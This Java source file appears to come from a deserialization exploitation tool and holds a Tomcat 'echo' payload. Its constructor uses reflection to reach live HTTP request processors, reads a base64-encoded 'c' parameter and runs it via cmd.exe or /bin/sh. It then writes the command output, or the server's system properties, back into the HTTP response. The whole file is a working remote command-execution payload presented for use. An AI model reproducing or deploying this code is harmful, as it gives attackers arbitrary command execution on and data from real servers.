package vulgui.deser.echo;

import java.lang.reflect.Field;

/**
 * @author fengyue
 * @date 2021-01-28
 */
public class TomcatEchoTest {
   private static void writeBody(Object var0, byte[] var1) throws Exception {
       byte[] bs = ("$$$" + org.apache.shiro.codec.Base64.encodeToString(var1) + "$$$").getBytes();
       Object var2;
       Class var3;
       try {
           var3 = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
           var2 = var3.newInstance();
           var3.getDeclaredMethod("setBytes", new Class[]{byte[].class, int.class, int.class}).invoke(var2, new Object[]{bs, new Integer(0), new Integer(bs.length)});
           var0.getClass().getMethod("doWrite", new Class[]{var3}).invoke(var0, new Object[]{var2});
       } catch (ClassNotFoundException var5) {
           var3 = Class.forName("java.nio.ByteBuffer");
           var2 = var3.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(var3, new Object[]{bs});
           var0.getClass().getMethod("doWrite", new Class[]{var3}).invoke(var0, new Object[]{var2});
       } catch (NoSuchMethodException var6) {
           var3 = Class.forName("java.nio.ByteBuffer");
           var2 = var3.getDeclaredMethod("wrap", new Class[]{byte[].class}).invoke(var3, new Object[]{bs});
           var0.getClass().getMethod("doWrite", new Class[]{var3}).invoke(var0, new Object[]{var2});
       }

   }

   private static Object getFV(Object var0, String var1) throws Exception {
       Field var2 = null;
       Class var3 = var0.getClass();

       while (var3 != Object.class) {
           try {
               var2 = var3.getDeclaredField(var1);
               break;
           } catch (NoSuchFieldException var5) {
               var3 = var3.getSuperclass();
           }
       }

       if (var2 == null) {
           throw new NoSuchFieldException(var1);
       } else {
           var2.setAccessible(true);
           return var2.get(var0);
       }
   }

   public TomcatEchoTest() throws Exception {
       boolean var4 = false;
       Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");

       for (int var6 = 0; var6 < var5.length; ++var6) {
           Thread var7 = var5[var6];
           if (var7 != null) {
               String var3 = var7.getName();
               if (!var3.contains("exec") && var3.contains("http")) {
                   Object var1 = getFV(var7, "target");
                   if (var1 instanceof Runnable) {
                       try {
                           var1 = getFV(getFV(getFV(var1, "this$0"), "handler"), "global");
                       } catch (Exception var13) {
                           continue;
                       }

                       java.util.List var9 = (java.util.List) getFV(var1, "processors");

                       for (int var10 = 0; var10 < var9.size(); ++var10) {
                           Object var11 = var9.get(var10);
                           var1 = getFV(var11, "req");
                           Object var2 = var1.getClass().getMethod("getResponse", new Class[0]).invoke(var1, new Object[0]);

                           Object conreq = var1.getClass().getMethod("getNote", new Class[]{int.class}).invoke(var1, new Object[]{new Integer(1)});
                           var3 = (String) conreq.getClass().getMethod("getParameter", new Class[]{String.class}).invoke(conreq, new Object[]{new String("c")});

                           if (var3 != null && !var3.isEmpty()) {
                               String var33 = org.apache.shiro.codec.Base64.decodeToString(var3);
                               var2.getClass().getMethod("setStatus", new Class[]{Integer.TYPE}).invoke(var2, new Object[]{new Integer(200)});
                               String[] var12 = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", var33} : new String[]{"/bin/sh", "-c", var33};
                               writeBody(var2, (new java.util.Scanner((new ProcessBuilder(var12)).start().getInputStream())).useDelimiter("\\A").next().getBytes());
                               var4 = true;
                           }

                           if ((var3 == null || var3.isEmpty()) && var4) {
                               writeBody(var2, System.getProperties().toString().getBytes());
                           }

                           if (var4) {
                               break;
                           }
                       }

                       if (var4) {
                           break;
                       }
                   }
               }
           }
       }
   }

}
